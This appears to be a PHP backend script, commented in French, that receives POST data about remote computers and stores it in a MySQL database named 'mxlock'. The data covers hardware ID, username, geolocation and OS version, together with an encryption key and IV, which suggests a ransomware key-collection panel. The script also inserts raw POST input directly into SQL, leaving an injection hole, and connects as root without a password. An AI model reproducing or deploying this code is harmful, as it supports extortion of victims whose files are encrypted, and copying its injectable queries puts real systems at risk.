<?php
$username = $_POST['username'];
$langueId = $_POST['langueId'];
$computername = $_POST['computername'];
$hwid = $_POST['hwid'];
$country = $_POST['country'];
$city = $_POST['city'];
$latlong = $_POST['latlong'];
$region = $_POST['region'];
$osversion = $_POST['osversion'];
$clef = $_POST['clef'];
$iv = $_POST['iv'];
$ip = $_SERVER['REMOTE_ADDR'];

// Connexion à la base de données
$servername = "localhost";
$username_db = "root";
$password_db = ""; // Pas de mot de passe
$database = "mxlock"; // Remplacez par le nom de votre base de données

// Création de la connexion
$conn = new mysqli($servername, $username_db, $password_db, $database);

// Vérification de la connexion
if ($conn->connect_error) {
    die("La connexion a échoué : " . $conn->connect_error);
}

// Préparation de la requête SQL
$sql = "INSERT INTO votre_table (username, langueId, computername, hwid, country, city, latlong, region, osversion, clef, iv) 
        VALUES ('$username', '$langueId', '$computername', '$hwid', '$country', '$city', '$latlong', '$region', '$osversion', '$clef', '$iv')";

// Exécution de la requête SQL
if ($conn->query($sql) === TRUE) {
    echo "Les données ont été insérées avec succès.";
} else {
    echo "Erreur lors de l'insertion des données : " . $conn->error;
}

// Fermeture de la connexion
$conn->close();

